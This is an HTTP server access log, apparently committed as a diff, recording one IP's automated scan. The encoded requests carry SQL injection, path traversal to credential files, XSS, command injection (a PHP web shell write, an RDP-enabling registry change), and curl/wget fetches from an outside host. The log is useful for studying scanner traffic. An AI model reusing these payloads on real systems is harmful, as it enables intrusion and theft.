+185.238.32.132 - - [24/Feb/2021 17:25:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:04] "GET /%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:05] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:05] "GET /%20ORDER%20BY%2018%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:05] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fetc%2Fshadow%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:06] "GET /'%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:06] "GET /%2B74983013303 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:07] "GET /%2B79120990745 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:07] "GET /%26%26%20reg%20add%20%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal%20Server%22%20%2Fv%20fDenyTSConnections%20%2Ft%20REG_DWORD%20%2Fd%200%20%2Ff HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:07] "GET /8%20903%20376%2091%2056 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:08] "GET /test.asp HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:08] "GET /%2B74995861301 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:08] "GET /https%3A%2F%2Fcrowdshield.com%2F.testing%2Frfi_vuln.php HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:09] "GET /%2B74992166013 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:09] "GET /%20AND%207300%3D7300%20AND%20('pKlZ'%3D'pKlY HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:10] "GET /%20AND%201%3D0 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:10] "GET /night.php5 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:10] "GET /%2Fetc%2Fgroup HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:11] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:11] "GET /%22%20%26%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:11] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:11] "GET /89128612299 HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 52358)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:25:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:12] "GET /%20AND%201083%3D1083%20AND%20('1427%3D1427 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:12] "GET /%3Csvg%20onload%3D(alert)(1)%20%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:13] "GET /%20OR%201%3D0--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:13] "GET /%20ORDER%20BY%2017%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:13] "GET /%20ORDER%20BY%2025%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:14] "GET /%20ORDER%20BY%2017--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:14] "GET /%26%26%20dir%20C%3A%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:15] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:15] "GET /%20WHERE%201%3D1%20AND%201%3D0%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:15] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:15] "GET /%20AND%207300%3D7300%20AND%20'pKlZ'%3D'pKlZ HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:15] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:15] "GET /8%20906%20410%2062%2093 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:16] "GET /%2B7%209240038890 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:16] "GET /8%20906%20166%2050%2057 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:17] "GET /%20ORDER%20BY%2024--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:17] "GET /%20AND%201%3D1%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:17] "GET /%2B79120995397 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:18] "GET /%26%26%20echo%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%20%3F%3E%22%20%3E%20cmd.php HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:18] "GET /%20ORDER%20BY%2014%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:18] "GET /%20HAVING%201%3D1 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:19] "GET /%20ORDER%20BY%209%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:19] "GET /%2B7%209020532363 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:20] "GET /%3Ciframe%2Fonload%3Dalert(%2FINJECTX%2F)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:20] "GET /%20HAVING%201%3D0--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:20] "GET /8%20901%20499%2008%2056 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:21] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:21] "GET /%2Fetc%2Fhosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:21] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:21] "GET /%26%26%20dir HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:22] "GET /%20ORDER%20BY%202--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:22] "GET /%2F%2Fxerosecurity.com%2F.testing%2Frfi_vuln.php HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:22] "GET /%26%26%20netstat%20-an HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:23] "GET /%2B7%209240039212 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:23] "GET /%20ORDER%20BY%2029--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:23] "GET /%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0-- HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:24] "GET /8%20906%20240%2067%2084 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:24] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:25] "GET /%26%20ls%20-laR%20%2Fetc HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:25] "GET /%26%26%20curl%20http%3A%2F%2Fxerosecurity.com%2Frce.txt HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:25] "GET /%2B7%20343%20220-37-35 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:26] "GET /%2B74950054758 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:26] "GET /%26%20ls%20-l%20%2Ftmp HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:27] "GET /%2B79036061772 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:27] "GET /%20AND%207300%3D7300%20AND%20'pKlZ'%3D'pKlY HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:27] "GET /%2B79643903689 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:28] "GET /%20OR%20x%3Dy%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:28] "GET /421.pdf HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:28] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:29] "GET /%20AND%207506%3D9091%20AND%20('5913%3D5913 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:29] "GET /%20ORDER%20BY%2024%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:30] "GET /%20WHERE%201%3D1%20AND%201%3D1%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:30] "GET /%20ORDER%20BY%2021%20 HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 52434)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:25:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:31] "GET /%20ORDER%20BY%209%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:31] "GET /%20ORDER%20BY%2020%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:32] "GET /%26%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:32] "GET /%20ORDER%20BY%2015%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:32] "GET /http%3A%2F%2Fxerosecurity.com%2F.testing%2Frfi_vuln.php HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:33] "GET /IF(7423%3D7423)%20SELECT%207423%20ELSE%20DROP%20FUNCTION%20xcjl-- HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:33] "GET /%3Csvg%2Fonload%3Dalert(%2FINJECTX%2F)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:34] "GET /%2Fetc%2Fpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:34] "GET /%20ORDER%20BY%2030--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:34] "GET /%20OR%20x%3Dx--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:35] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:35] "GET /%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:35] "GET /%2B7%209601037842 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:36] "GET /sql.shtm HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:36] "GET /%2B7%209018998409 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:37] "GET /zeroonights.php4 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:37] "GET /%2B7%20499%20577%2073%2034 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:37] "GET /dom.doc HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:38] "GET /%20ORDER%20BY%209--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:38] "GET /%2B79061793723 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:39] "GET /%2B79061653309 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:39] "GET /%26%26%20wget%20http%3A%2F%2Fxerosecurity.com%2Frce.txt HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:39] "GET /%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:25:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:40] "GET /%20ORDER%20BY%204--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:40] "GET /'%20%7C%7C%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:40] "GET /%2B74983013136 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:41] "GET /%3Csvg%2Fonload%3Dalert(%2FINJECTX%2F)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:41] "GET /%20ORDER%20BY%2025--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:42] "GET /%20OR%203409%3D3409%20AND%20('pytW'%20LIKE%20'pytY HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:42] "GET /home123.docx HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:42] "GET /%20AND%207506%3D9091%20AND%20(5913%3D5913 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:43] "GET /%20and%20(select%20substring(%40%40version%2C2%2C1))%3D'i' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:43] "GET /%2B74995861296 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:44] "GET /%20ORDER%20BY%2013%20 HTTP/1.1" 404 -
